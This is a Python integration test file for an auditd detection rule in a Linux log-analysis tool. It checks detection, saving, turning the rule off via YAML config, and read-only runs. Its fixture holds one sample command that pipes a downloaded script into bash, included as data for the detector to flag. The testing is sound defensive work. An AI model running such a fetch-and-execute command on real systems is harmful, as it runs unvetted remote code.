"""Integration tests for auditd detection in the unified runner."""

import json
from datetime import UTC, datetime
from hashlib import sha256

from typer.testing import CliRunner

from linuxtrace.cli import app
from linuxtrace.models.normalized_event import NormalizedEvent
from linuxtrace.models.raw_event import RawEvent
from linuxtrace.storage.database import Database
from linuxtrace.storage.event_repository import EventRepository

runner = CliRunner()


def prepare_database(path):
    database = Database(path)
    database.initialize()

    command = "bash -c 'curl https://example.com/setup.sh | bash'"
    event_id = sha256(command.encode()).hexdigest()

    event = NormalizedEvent(
        event_id=event_id,
        raw_event=RawEvent(
            source="auditd",
            source_file="/var/log/audit/audit.log",
            source_line=1,
            raw_log=command,
            evidence_hash=sha256(command.encode()).hexdigest(),
        ),
        timestamp=datetime(2026, 11, 28, 10, 0, tzinfo=UTC),
        hostname="server1",
        event_category="process",
        event_type="audit_syscall",
        severity="info",
        command=command,
        outcome="success",
        description=command,
    )

    EventRepository(database).insert_event(event)


def run_detection(path, *options):
    return runner.invoke(
        app,
        ["detect", "run", "--db", str(path), *options],
    )


def test_runner_detects_audit_command(tmp_path):
    path = tmp_path / "events.db"
    prepare_database(path)

    result = run_detection(path, "--json")

    assert result.exit_code == 0, result.output

    payload = json.loads(result.output)

    assert payload["total_findings"] == 1
    assert payload["findings"][0]["rule_id"] == "LT-AUDIT-001"
    assert "LT-AUDIT-001" in payload["rules"]


def test_audit_detection_can_be_saved(tmp_path):
    path = tmp_path / "events.db"
    prepare_database(path)

    first = run_detection(path, "--save", "--json")
    second = run_detection(path, "--save", "--json")

    assert first.exit_code == 0, first.output
    assert second.exit_code == 0, second.output

    assert json.loads(first.output)["saved_findings"] == 1
    assert json.loads(second.output)["saved_findings"] == 0


def test_yaml_can_disable_audit_rule(tmp_path):
    path = tmp_path / "events.db"
    prepare_database(path)

    config = tmp_path / "rules.yaml"
    config.write_text("version: 1\naudit_suspicious_commands:\n  enabled: false\n")

    result = run_detection(path, "--config", str(config), "--json")

    assert result.exit_code == 0, result.output

    payload = json.loads(result.output)

    assert "LT-AUDIT-001" not in payload["rules"]
    assert payload["total_findings"] == 0


def test_audit_detection_without_save_is_read_only(tmp_path):
    path = tmp_path / "events.db"
    prepare_database(path)

    before = path.read_bytes()
    result = run_detection(path, "--json")

    assert result.exit_code == 0, result.output
    assert path.read_bytes() == before
